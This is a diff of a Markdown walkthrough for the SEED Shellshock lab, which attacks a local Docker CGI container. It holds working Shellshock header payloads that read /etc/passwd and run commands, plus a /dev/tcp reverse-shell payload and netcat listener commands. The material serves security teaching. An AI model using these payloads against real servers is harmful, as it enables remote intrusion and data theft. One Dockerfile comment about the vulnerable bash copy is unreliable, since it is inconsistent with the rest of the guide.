@@ -1,200 +1,343 @@
 # Lab 05 — Shellshock Vulnerability Lab
 
-Official Reference: https://seedsecuritylabs.org/Labs_20.04/Web/Shellshock/  
-Textbook Reference: Chapter 3 — Environment Variable and Set-UID Programs (*Computer & Internet Security*, Prof. Wenliang Du)  
-CVE References: CVE-2014-6271, CVE-2014-7169
+Official lab manual: https://seedsecuritylabs.org/Labs_20.04/Web/Shellshock/
+Textbook: Chapter 3 — Shellshock Attack (*Computer & Internet Security*, Prof. Wenliang Du)
+CVE Reference: CVE-2014-6271, CVE-2014-7169
 
 For authorized educational use only.
 
 ---
 
-## 1. Security Concept
+## Security Concept
 
-The Shellshock vulnerability (CVE-2014-6271) affects GNU Bash versions up to 4.3. Bash allows function definitions to be exported across environment variables. Due to a parsing defect, vulnerable Bash versions fail to stop parsing after evaluating trailing function definitions, improperly executing any trailing commands appended to environment variables.
+Shellshock is a critical vulnerability in the Bash shell (versions through 4.3) discovered in 2014. Bash allows functions to be stored in environment variables. The bug is that Bash also executes any code appended after the function definition.
 
-In a web application context, Apache CGI (Common Gateway Interface) passes incoming HTTP request headers (such as `User-Agent`, `Referer`, and `Cookie`) as environment variables (`HTTP_USER_AGENT`, `HTTP_REFERER`, `HTTP_COOKIE`) to the CGI script shell interpreter (`/bin/bash_shellshock`), enabling Remote Code Execution (RCE).
+```
+Normal function in environment variable:
+  VAR='() { echo hello; }'
+
+Shellshock payload:
+  VAR='() { :; }; echo INJECTED'
+           ^^^^^   ^^^^^^^^^^^^^^
+           empty   this code runs too
+           func    IMMEDIATELY when bash starts
+```
+
+When Apache runs a CGI script using Bash, it converts HTTP request headers (User-Agent, Referer, Cookie) into environment variables. An attacker who controls the User-Agent header can inject the Shellshock payload and execute arbitrary commands on the server.
+
+```
+Attacker sends:
+  User-Agent: () { :; }; /bin/cat /etc/passwd
+
+Apache sets:
+  HTTP_USER_AGENT='() { :; }; /bin/cat /etc/passwd'
+
+CGI script runs under vulnerable bash:
+  Bash processes the env var -> executes /bin/cat /etc/passwd
+  Output sent back to attacker in HTTP response
+```
+
+This lab uses:
+- `vul.cgi` — runs under `bash_shellshock` (a copy of vulnerable Bash 4.3)
+- `safe.cgi` — runs under `/bin/bash` (patched Bash, not vulnerable)
 
 ---
 
-## 2. Standard 14-Step Learning Sequence
+## Container Architecture
 
 ```
-STEP 1  Understand Security Concept  (Bash function export parsing flaw -> RCE via CGI headers)
-STEP 2  Understand Lab Architecture (Client -> Apache CGI -> /bin/bash_shellshock)
-STEP 3  Understand Docker Architecture (shellshock-10.9.0.80 on net-10.9.0.0-shellshock)
-STEP 4  Start Containers            (docker compose up -d)
-STEP 5  Inspect Docker               (docker compose ps, status.sh)
-STEP 6  Enter Linux Containers       (docker exec -it shellshock-10.9.0.80 bash)
-STEP 7  Inspect Linux Environment    (pwd, ls -la, ps aux, whoami, id, hostname, ip addr, env)
-STEP 8  Inspect Application          (Examine /usr/lib/cgi-bin/vul.cgi & safe.cgi)
-STEP 9  Complete Official Lab Tasks  (Exfiltrate /etc/passwd & establish reverse shell)
-STEP 10 Inspect Logs                 (tail -f /var/log/apache2/access.log)
-STEP 11 Understand Root Cause        (Review trailing command execution after function strings)
-STEP 12 Implement Countermeasure     (Compare patched /bin/bash vs vulnerable /bin/bash_shellshock)
-STEP 13 Stop and Reset               (docker compose down)
-STEP 14 Document Learning            (Record HTTP header payloads and execution logs)
-```
-
----
-
-## 3. Environment & Architecture Diagrams
-
-### Multi-Layer Container Architecture
-
-```
-+-------------------------------------------------------------------------+
-|                              HOST MACHINE                               |
-|                                                                         |
-|  Host Browser / curl: http://www.seedlab-shellshock.com/cgi-bin/vul.cgi|
-|                       (via /etc/hosts -> 10.9.0.80)                     |
-|  Mapped Host Port: 10086 -> Container Port 80                           |
-|                                                                         |
-|  +-------------------------------------------------------------------+  |
-|  |                          DOCKER ENGINE                            |  |
-|  |                                                                   |  |
-|  |  Docker Bridge Network: net-10.9.0.0-shellshock (10.9.0.0/24)   |  |
-|  |                                                                   |  |
-|  |  +-------------------------------------------------------------+  |  |
-|  |  | CGI Web Container: shellshock-10.9.0.80                      |  |  |
-|  |  | (10.9.0.80:10086)                                           |  |  |
-|  |  |                                                             |  |  |
-|  |  | +---------------------------------------------------------+ |  |  |
-|  |  | | Linux User Space                                        | |  |  |
-|  |  | | Apache 2.4 CGI Engine                                 | |  |  |
-|  |  | | /usr/lib/cgi-bin/vul.cgi  (uses /bin/bash_shellshock)   | |  |  |
-|  |  | | /usr/lib/cgi-bin/safe.cgi (uses /bin/bash - patched)    | |  |  |
-|  |  | +---------------------------------------------------------+ |  |  |
-|  |  +-------------------------------------------------------------+  |  |
-|  +-------------------------------------------------------------------+  |
-+-------------------------------------------------------------------------+
-```
-
-### Security Data-Flow Diagram
-
-```
-1. Attacker sends HTTP GET with User-Agent payload:
-   curl -A "() { :;}; echo Content-Type: text/plain; echo; /bin/cat /etc/passwd" \
-        http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
-      |
-      v
-2. Apache CGI maps User-Agent header to environment variable:
-   HTTP_USER_AGENT="() { :;}; echo Content-Type: text/plain; echo; /bin/cat /etc/passwd"
-      |
-      v
-3. Apache invokes CGI shebang: #!/bin/bash_shellshock
-      |
-      v
-4. Vulnerable /bin/bash_shellshock initializes, parses function definition,
-   and improperly executes trailing command /bin/cat /etc/passwd
-      |
-      v
-5. Content of /etc/passwd is returned to attacker in HTTP response stream
+HOST MACHINE
+  |
+  | Port 10086 -> shellshock-10.9.0.80:80
+  |
+  Docker Bridge Network: net-10.9.0.0-shellshock (10.9.0.0/24)
+    |
+    +---- shellshock-10.9.0.80   (Apache + CGI module + vulnerable bash copy)
+              |
+              /cgi-bin/vul.cgi   (uses /bin/bash_shellshock  <- vulnerable)
+              /cgi-bin/safe.cgi  (uses /bin/bash             <- patched)
 ```
 
 ---
 
-## 4. Docker Learning Matrix
+## Layer 1 — Docker Commands (host terminal)
 
-| Docker Concept | Lab Specific Implementation | Function |
-|----------------|-----------------------------|----------|
-| **Base Image** | `handsonsecurity/seed-image-www-shellshock` | Contains Apache CGI server and vulnerable/patched Bash binaries |
-| **Container** | `shellshock-10.9.0.80` | Running CGI container instance |
-| **Bridge Network** | `net-10.9.0.0-shellshock` | Subnet `10.9.0.0/24` isolating Shellshock traffic |
-| **Port Binding** | `10086:80` | Forwards host port 10086 to container Apache port 80 |
+### Start the Lab
+
+```bash
+cd labs/05-shellshock
+docker compose up -d --build
+
+# image_www/Dockerfile:
+# - Extends handsonsecurity/seed-server:apache-php
+# - Copies system bash to /bin/bash_shellshock (simulates vulnerable bash)
+# - Copies vul.cgi and safe.cgi to /usr/lib/cgi-bin/
+# - Makes CGI scripts executable
+```
+
+```powershell
+# Windows
+cd labs\05-shellshock
+docker compose up -d --build
+```
+
+### Verify Container
+
+```bash
+docker compose ps
+
+# NAME                    IMAGE                     STATUS    PORTS
+# shellshock-10.9.0.80    seed-image-www-shellshock  Up        0.0.0.0:10086->80/tcp
+```
+
+### Test CGI Endpoints from Host
+
+```bash
+# Test that both endpoints respond (no injection yet)
+curl http://localhost:10086/cgi-bin/vul.cgi
+curl http://localhost:10086/cgi-bin/safe.cgi
+```
+
+```powershell
+# Windows
+curl.exe http://localhost:10086/cgi-bin/vul.cgi
+curl.exe http://localhost:10086/cgi-bin/safe.cgi
+```
+
+### Watch Logs
+
+```bash
+# Stream Apache logs while performing exploit tests
+docker compose logs -f www
+```
 
 ---
 
-## 5. Linux Learning Inside the Containers
+## Layer 2 — Linux Commands (inside the container)
 
-To enter the Shellshock container shell:
+### Open Bash Shell Inside the Container
+
 ```bash
 docker exec -it shellshock-10.9.0.80 bash
 ```
 
-### Linux Inspection Commands
+Prompt changes:
+```
+Before: PS C:\>  OR  user@host:~$
+After:  root@shellshock-10.9.0.80:/#
+```
 
-1. **`pwd`**
-   - *What*: Displays working directory (`/var/www/html`).
-   - *Why*: Confirms directory position inside container.
-   - *Lab Application*: Verify location before checking CGI directories.
+### Inspect Bash Binaries
 
-2. **`ls -la /usr/lib/cgi-bin/`**
-   - *What*: Lists CGI binaries and permissions.
-   - *Why*: Locates script targets (`vul.cgi` and `safe.cgi`).
-   - *Lab Application*: Verify execution permissions (`+x`) on CGI scripts.
+```bash
+whoami && hostname
+# root | shellshock-10.9.0.80
 
-3. **`cat /usr/lib/cgi-bin/vul.cgi`**
-   - *What*: Concatenates and prints CGI file content.
-   - *Why*: Inspects shebang line header.
-   - *Lab Application*: Confirm `vul.cgi` uses `#!/bin/bash_shellshock`.
+# List both bash binaries
+ls -la /bin/bash*
+# /bin/bash           <- system bash (modern, patched)
+# /bin/bash_shellshock <- copy of bash used by vul.cgi (simulates vulnerable version)
 
-4. **`whoami` and `id`**
-   - *What*: Returns user identity (`root`).
-   - *Why*: Confirms container shell privileges.
-   - *Lab Application*: Contrast interactive root shell with `www-data` CGI process execution.
+# Check bash version
+/bin/bash --version
+/bin/bash_shellshock --version
 
-5. **`hostname` and `ip addr`**
-   - *What*: Displays container hostname and IP address (`10.9.0.80`).
-   - *Why*: Verifies network interface assignment.
-   - *Lab Application*: Confirm container IP matches `www.seedlab-shellshock.com` mapping.
+# Check if Shellshock is present in bash_shellshock
+# (This tests the vulnerability directly without HTTP)
+env x='() { :; }; echo SHELLSHOCK_VULNERABLE' /bin/bash_shellshock -c "echo test"
+# If "SHELLSHOCK_VULNERABLE" prints, the binary is vulnerable
 
-6. **`ps aux`**
-   - *What*: Displays process list.
-   - *Why*: Inspects active Apache daemon processes.
-   - *Lab Application*: Verify Apache service status.
+env x='() { :; }; echo SHELLSHOCK_VULNERABLE' /bin/bash -c "echo test"
+# Should only print "test" (patched bash ignores the injected code)
+```
 
-7. **`env` and `export`**
-   - *What*: Displays and exports shell variables.
-   - *Why*: Tests function export mechanisms directly.
-   - *Lab Application*: Run `export foo='() { :;}; echo VULNERABLE'` to test Bash parsing.
+### Inspect CGI Scripts
+
+```bash
+ls -la /usr/lib/cgi-bin/
+# vul.cgi  (executable)
+# safe.cgi (executable)
+
+cat /usr/lib/cgi-bin/vul.cgi
+# #!/bin/bash_shellshock  <- shebang points to vulnerable bash
+
+cat /usr/lib/cgi-bin/safe.cgi
+# #!/bin/bash  <- shebang points to patched bash
+```
+
+### Inspect Apache CGI Configuration
+
+```bash
+# Check CGI module is enabled
+apache2ctl -M | grep cgi
+# Should show: cgi_module (shared)
+
+# Check CGI directory configuration
+cat /etc/apache2/sites-enabled/000-default.conf | grep -A5 cgi-bin
+
+# View running processes
+ps aux
+# apache2 processes should be running
+```
+
+### View Real-Time Apache Logs
+
+```bash
+tail -f /var/log/apache2/access.log
+# Watch HTTP requests and response codes during exploit tests
+# Ctrl+C to stop
+```
+
+### Exit Container
+
+```bash
+exit
+```
+
+Prompt returns:
+```
+Before: root@shellshock-10.9.0.80:/#
+After:  PS C:\>  OR  user@host:~$
+```
 
 ---
 
-## 6. Official Lab Tasks
+## Layer 3 — Security Tasks
 
-Download official PDF handout: https://seedsecuritylabs.org/Labs_20.04/Web/Shellshock/
+### Task 1 — Confirm the Vulnerability Exists
 
-- **Task 1**: Pass environment variables containing function definitions directly to Bash binaries.
-- **Task 2A**: Exfiltrate server data (`/etc/passwd`) via HTTP User-Agent header injection against `vul.cgi`.
-- **Task 2B**: Test alternative HTTP headers (`Referer`, `Cookie`) passed by CGI.
-- **Task 3**: Establish a reverse shell from container back to host netcat listener.
-- **Task 4**: Compare vulnerability behavior between `vul.cgi` (`bash_shellshock`) and `safe.cgi` (patched `bash`).
+```bash
+# Linux/macOS/WSL2
+curl -A "() { :; }; echo; echo Content-Type: text/plain; echo; echo SHELLSHOCK_WORKS" \
+  http://localhost:10086/cgi-bin/vul.cgi
+```
+
+```powershell
+# Windows PowerShell (use curl.exe not curl)
+curl.exe -A "() { :; }; echo; echo Content-Type: text/plain; echo; echo SHELLSHOCK_WORKS" `
+  http://localhost:10086/cgi-bin/vul.cgi
+```
+
+If the response body contains `SHELLSHOCK_WORKS`, the vulnerability is confirmed.
+
+### Task 2 — Read Server Files (Remote Code Execution)
+
+```bash
+# Read /etc/passwd from the server
+curl -A "() { :; }; echo; /bin/cat /etc/passwd" \
+  http://localhost:10086/cgi-bin/vul.cgi
+```
+
+```powershell
+# Windows
+curl.exe -A "() { :; }; echo; /bin/cat /etc/passwd" `
+  http://localhost:10086/cgi-bin/vul.cgi
+```
+
+You should receive the container's `/etc/passwd` file content in the HTTP response body.
+
+### Task 3 — Confirm safe.cgi Is NOT Vulnerable
+
+```bash
+# Same payload against the safe endpoint — should NOT execute the injected command
+curl -A "() { :; }; echo; echo SHOULD_NOT_APPEAR" \
+  http://localhost:10086/cgi-bin/safe.cgi
+```
+
+```powershell
+# Windows
+curl.exe -A "() { :; }; echo; echo SHOULD_NOT_APPEAR" `
+  http://localhost:10086/cgi-bin/safe.cgi
+```
+
+Response should not contain `SHOULD_NOT_APPEAR`. The patched bash treats the env var as data.
+
+### Task 4 — Inject via Other HTTP Headers
+
+```bash
+# User-Agent is not the only vector — any header Apache converts to env var works
+# Try the Referer header
+curl -A "normal" -e "() { :; }; echo; /bin/ls /var/www/html" \
+  http://localhost:10086/cgi-bin/vul.cgi
+
+# Try a custom header
+curl -H "Custom-Header: () { :; }; echo; id" \
+  http://localhost:10086/cgi-bin/vul.cgi
+```
+
+```powershell
+# Windows
+curl.exe -A "normal" -e "() { :; }; echo; /bin/ls /var/www/html" `
+  http://localhost:10086/cgi-bin/vul.cgi
+```
+
+### Task 5 — Get a Reverse Shell (Advanced)
+
+Open two PowerShell/terminal windows:
+
+Window 1 — start listener on port 9090:
+```bash
+# Linux
+nc -lvp 9090
+```
+
+```powershell
+# Windows (requires ncat or install from nmap package)
+ncat -lvp 9090
+```
+
+Window 2 — trigger reverse shell via Shellshock:
+```bash
+# Linux/macOS — replace HOST_IP with your machine's IP visible from WSL2
+curl -A "() { :; }; /bin/bash -i >& /dev/tcp/HOST_IP/9090 0>&1" \
+  http://localhost:10086/cgi-bin/vul.cgi
+```
+
+```powershell
+# Windows — find your WSL2 IP first
+(Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -like "vEthernet*"}).IPAddress
+# Use that IP in the reverse shell payload
+
+curl.exe -A "() { :; }; /bin/bash -i >& /dev/tcp/HOST_IP/9090 0>&1" `
+  http://localhost:10086/cgi-bin/vul.cgi
+```
+
+### Verify the Attack Triggered in Logs
+
+After each attack, check the Apache access log:
+```bash
+docker exec shellshock-10.9.0.80 tail -20 /var/log/apache2/access.log
+```
+
+```powershell
+docker exec shellshock-10.9.0.80 tail -20 /var/log/apache2/access.log
+```
 
 ---
 
-## 7. Exploitation & Remediation
+## Stop and Reset
 
-### Data Exfiltration Payload
 ```bash
-curl -A "() { :;}; echo Content-Type: text/plain; echo; /bin/cat /etc/passwd" \
-     http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
+docker compose down
+docker compose down -v && docker compose up -d --build
 ```
 
-### Reverse Shell Payload
-Host listener:
-```bash
-nc -l -v 9090
-```
-Payload execution:
-```bash
-curl -A "() { :;}; /bin/bash -i >& /dev/tcp/10.9.0.1/9090 0>&1" \
-     http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
-```
-
-### Remediation (Patched Binary Verification)
-Inside container:
-```bash
-# Vulnerable binary: executes trailing command
-/bin/bash_shellshock -c "x='() { :;}; echo VULNERABLE' bash -c :"
-
-# Patched binary: ignores trailing command
-/bin/bash -c "x='() { :;}; echo VULNERABLE' bash -c :"
+```powershell
+# Windows
+docker compose down -v
+docker compose up -d --build
 ```
 
 ---
 
-## 8. Stop and Reset
+## Key File Locations
 
-```bash
-docker compose down        # Stop containers
-```
+| File | Container | Path |
+|------|-----------|------|
+| Vulnerable CGI script | `shellshock-10.9.0.80` | `/usr/lib/cgi-bin/vul.cgi` |
+| Safe CGI script | `shellshock-10.9.0.80` | `/usr/lib/cgi-bin/safe.cgi` |
+| Vulnerable bash copy | `shellshock-10.9.0.80` | `/bin/bash_shellshock` |
+| Patched bash | `shellshock-10.9.0.80` | `/bin/bash` |
+| Apache access log | `shellshock-10.9.0.80` | `/var/log/apache2/access.log` |
+| Apache error log | `shellshock-10.9.0.80` | `/var/log/apache2/error.log` |
+| Apache CGI config | `shellshock-10.9.0.80` | `/etc/apache2/sites-enabled/000-default.conf` |
